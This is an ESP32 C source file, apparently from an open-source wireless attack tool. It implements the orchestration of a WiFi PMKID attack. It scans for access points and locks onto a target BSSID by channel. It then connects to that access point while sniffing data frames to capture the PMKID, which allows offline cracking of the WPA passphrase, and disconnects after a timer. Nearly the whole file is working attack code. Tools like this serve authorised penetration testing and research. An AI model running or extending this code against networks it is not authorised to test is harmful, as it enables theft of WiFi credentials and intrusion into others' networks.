/*
 * @file arma_pmkid.c
 * @author johndeweyzxc (johndewey02003@gmail.com)
 * @brief Implementation of methods for orchestrating the PMKID attack
 */

#include "arma_pmkid.h"

#include <stdio.h>
#include <string.h>

#include "arma_pmkid.h"
#include "arma_utils.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi_types.h"
#include "frame_parser_interface.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "wifi_ctl_interface.h"

ESP_EVENT_DECLARE_BASE(ARMAMENT_ATTACK_STATUS_EVENT_BASE);
static TaskHandle_t pmkid_sniff_task_handle = NULL;
static uint8_t int_target_bssid[6];

void pmkid_notif(void *args, esp_event_base_t event_base, int32_t event_id,
                 void *event_data) {
  arma_atk_event_data_t *notification_data;
  notification_data = (arma_atk_event_data_t *)event_data;

  if (notification_data->atk_context == PMKID_BASED) {
    printf("arma_pmkid.pmkid_notif > Received notification\n");
    arma_pmkid_finishing_sequence(0);
  }
}

void arma_pmkid_notif_event_register() {
  ESP_ERROR_CHECK(esp_event_handler_register(ARMAMENT_ATTACK_STATUS_EVENT_BASE,
                                             ATK_STATS_EVENT_ID, &pmkid_notif,
                                             NULL));
  printf("arma_pmkid.arma_pmkid_notif_event_register > *\n");
}

void arma_pmkid_notif_event_unregister() {
  ESP_ERROR_CHECK(esp_event_handler_unregister(
      ARMAMENT_ATTACK_STATUS_EVENT_BASE, ATK_STATS_EVENT_ID, &pmkid_notif));
  printf("arma_pmkid.arma_pmkid_notif_event_unregister > *\n");
}

void arma_delete_task_pmkid_sniff_duration() {
  if (pmkid_sniff_task_handle != NULL) {
    vTaskDelete(pmkid_sniff_task_handle);
    pmkid_sniff_task_handle = NULL;
  }
}

void arma_pmkid_finishing_sequence(uint8_t from_sniff_task) {
  printf("arma_pmkid.arma_pmkid_finishing_sequence > Finishing sequence\n");
  frame_parser_clear_target_parameter();
  frame_parser_unregister_data_frame_handler();
  arma_pmkid_notif_event_unregister();
  wifi_sniffer_stop();
  wifi_disconnect_from_ap(int_target_bssid);
  if (from_sniff_task == 0) {
    arma_delete_task_pmkid_sniff_duration();
  }
}

void arma_pmkid_sniff_duration() {
  while (1) {
    vTaskDelay(5000 / portTICK_PERIOD_MS);
    printf("arma_pmkid.arma_pmkid_sniff_duration > %02X%02X%02X%02X%02X%02X\n",
           int_target_bssid[0], int_target_bssid[1], int_target_bssid[2],
           int_target_bssid[3], int_target_bssid[4], int_target_bssid[5]);

    arma_pmkid_finishing_sequence(1);
    vTaskDelete(NULL);
    pmkid_sniff_task_handle = NULL;
  }
}

void arma_pmkid_launching_sequence(uint8_t *ssid_name, uint8_t ssid_len,
                                   uint8_t channel) {
  printf("arma_pmkid.arma_pmkid_launching_sequence > Launching sequence\n");
  frame_parser_set_target_parameter(int_target_bssid, PARSE_PMKID);
  frame_parser_register_data_frame_handler();
  arma_pmkid_notif_event_register();
  wifi_sniffer_start();
  wifi_set_filter(DATA);
  wifi_set_channel(channel);
  wifi_connect_to_ap(ssid_name, ssid_len, channel, int_target_bssid);
  xTaskCreatePinnedToCore(arma_pmkid_sniff_duration, TPS_NAME, TPS_STACK_SIZE,
                          NULL, TPS_PRIORITY, &pmkid_sniff_task_handle,
                          TPS_CORE_ID);
}

uint8_t calc_len_ssid_name(uint8_t *ssid_name) {
  uint8_t length = 0;
  for (uint8_t i = 0; i < 33; i++) {
    if (ssid_name[i] == 0) {
      break;
    } else {
      length++;
    }
  }
  if (length == 0) {
    printf("arma_pmkid.calc_len_ssid_name > Length of SSID is 0\n");
    return 0;
  }
  return length;
}

void arma_pmkid(char *target_bssid) {
  for (uint8_t i = 0; i < 6; i++) {
    uint8_t s1 = target_bssid[i + i];
    uint8_t s2 = target_bssid[i + i + 1];
    int_target_bssid[i] = convert_to_uint8_t(s1, s2);
  }

  wifi_scan_aps();
  ap_list_from_scan_t *ap_list = wifi_get_scanned_aps();
  wifi_ap_record_t *ap_records = ap_list->ap_record_list;
  uint16_t total_scanned_aps = ap_list->count;

  for (uint16_t i = 0; i < total_scanned_aps; i++) {
    wifi_ap_record_t ap_record = ap_records[i];
    output_ap_info(&ap_record);

    if (memcmp(ap_record.bssid, int_target_bssid, 6) == 0) {
      uint8_t ssid_len = calc_len_ssid_name(ap_record.ssid);
      uint8_t channel = ap_record.primary;
      uint8_t *bssid = ap_record.bssid;

      printf("arma_pmkid.arma_pmkid > Found ap: %02X%02X%02X%02X%02X%02X\n",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
      printf("arma_pmkid.arma_pmkid > Channel of ap is %u\n", channel);

      arma_pmkid_launching_sequence(ap_record.ssid, ssid_len, channel);
      break;
    }
  }
}